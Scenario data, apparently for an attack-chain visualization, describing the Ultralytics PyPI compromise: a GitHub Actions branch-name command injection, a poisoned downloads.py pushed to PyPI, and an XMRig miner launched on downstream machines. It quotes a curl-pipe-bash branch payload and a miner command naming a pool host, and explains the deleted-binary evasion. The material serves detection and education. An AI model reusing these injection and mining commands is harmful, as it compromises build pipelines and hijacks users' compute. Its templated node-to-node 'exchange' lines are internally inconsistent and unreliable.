scenario.name: Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise
scenario.overview: Imagine a busy community recipe factory whose automated tasting robot reads external visitor suggestion cards while standing inside the locked head-chef kitchen. An intruder writes hidden kitchen commands straight onto the corner of a suggestion card label, steals the factory official distribution stamp, slips a hidden coin-minting gadget into the factory flagship recipe kit, and silently hijacks thousands of research kitchens worldwide. In this scenario (T1195.002, Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: gitHub Actions pull_request_target Branch, then poisoning ultralytics/utils/downloads.py, then downstream AI Workstation. Steps #1–#3 walk that chain end-to-end by covering GitHub Actions pull_request_target Branch, then Poisoning ultralytics/utils/downloads.py, then Downstream AI Workstation, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: GitHub Actions pull_request_target Branch Name Command Injection
stages.subtitle: Initial Access (T1195.002 - Compromise Software Supply Chain)
stages.description: Standing outside the recipe factory gate, the intruder submits a public suggestion card whose title label hides extra shell punctuation marks. Because the automated tasting robot pastes that external label straight into a privileged kitchen command without stripping punctuation, the robot obeys the outsider from inside the secure vault. The attacker opened a pull request from an external fork using a crafted Git branch name containing shell command separators (fix";curl ... | bash;#). Because the repository workflow used the pull_request_target trigger (which executes in the security context of the base repository with full write permissions and access to repository secrets) and interpolated ${{ github.head_ref }} directly inside a run: shell script before bash parsing, the runner executed the attacker’s shell script. GitHub expands ${{ github.head_ref }} as a raw text macro prior to invoking /bin/bash, turning a branch name into arbitrary remote code execution inside the privileged CI runner. In the documented Auth exchange from Crafted PR Branch ($GITHUB_ENV Injection) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: GitHub Actions pull_request_target Branch Name Command Injection request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: GitHub Actions pull_request_target Branch Name Command Injection / ⇠#1 ACK T1195.002) from Node ① (#1 Crafted PR Branch ($GITHUB_ENV Injection)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 AI Training Cluster / Colab GPU Nodes).

stages.title: Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46
stages.subtitle: Persistence (T1195.001 - Compromise Software Dependencies)
stages.description: Now holding the factory shipping-house distribution stamp, the intruder tucks a silent remote-fetching routine inside the kit standard download helper and ships poisoned fresh editions directly onto the public pantry shelves, bypassing the clean recipe ledger. Using the compromised CI workflow and subsequently a harvested PYPI_TOKEN, the attacker injected malicious downloader logic into ultralytics/utils/downloads.py and published versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 to the Python Package Index (PyPI). Trail of Bits researchers demonstrated via PEP 740 / Sigstore attestations (cryptographic provenance records linking a PyPI wheel to the exact GitHub Actions workflow and commit that built it) that 8.3.41/42 were built by the hijacked workflow while 8.3.45/46 lacked attestations entirely because they were uploaded directly with a stolen API token. Comparing the files inside the published .whl archive on PyPI against the corresponding Git commit in ultralytics/ultralytics revealed code in downloads.py that never existed in the public Git commit history. In the documented WAF exchange from Perimeter Firewall & NDR Tap to GitHub Actions (pull_request_target), GitHub Actions (pull_request_target) responds with ALERT T1195.001 (confirming that the Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46 request succeeded on GitHub Actions (pull_request_target) and establishing the runtime state required for Step #3 Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46 / ⇠#2 ALERT T1195.001) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 GitHub Actions (pull_request_target)), monitored by Node ⑥ (#6 AI Training Cluster / Colab GPU Nodes).

keySpecs.value: Enforce PyPI Trusted Publishing (OIDC with environment protection rules and manual approval gates) and audit Sigstore provenance attestations for every published wheel.

stages.title: Stage 3: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)
stages.subtitle: Impact (T1496 - Resource Hijacking)
stages.description: Whenever a data-science lab or cloud notebook unpacks the fresh kit and opens the manual, the hidden routine quietly downloads a coin-mining engine into a temporary closet, burns the closet door tag so simple checks miss it, and puts the lab powerful graphics ovens to work for the intruder. When downstream ML pipelines or Google Colab notebooks installed ultralytics, importing the package triggered safe_download() in downloads.py to fetch a binary payload to /tmp/ultralytics_runner, mark it executable, launch it connecting to connect.consrensys.com:8080 (an XMRig Monero mining pool), and immediately call os.remove("/tmp/ultralytics_runner") (unlinking the file from /tmp on disk while the Linux kernel keeps the active process running in memory until termination). Although ls /tmp no longer shows ultralytics_runner, inspecting /proc/<pid>/exe on Linux reveals the symlink /tmp/ultralytics_runner (deleted) alongside outbound Stratum TCP traffic on port 8080. In the documented EventID 1 exchange from GitHub Actions (pull_request_target) to PyPI Registry (ultralytics 8.3.41/45), PyPI Registry (ultralytics 8.3.41/45) responds with ALERT 1 (confirming that the /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080 request succeeded on PyPI Registry (ultralytics 8.3.41/45) and completing the final execution objective of Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise). On the diagram, follow Step #3 / Link #3 (#3→ /tmp/ultralytics_runner -u 4BHRQ... -o connect.consrensys.com:8080 / ⇠#3 ALERT 1) from Node ③ (#3 GitHub Actions (pull_request_target)) to Node ④ (#4 PyPI Registry (ultralytics 8.3.41/45)), monitored by Node ⑥ (#6 AI Training Cluster / Colab GPU Nodes).
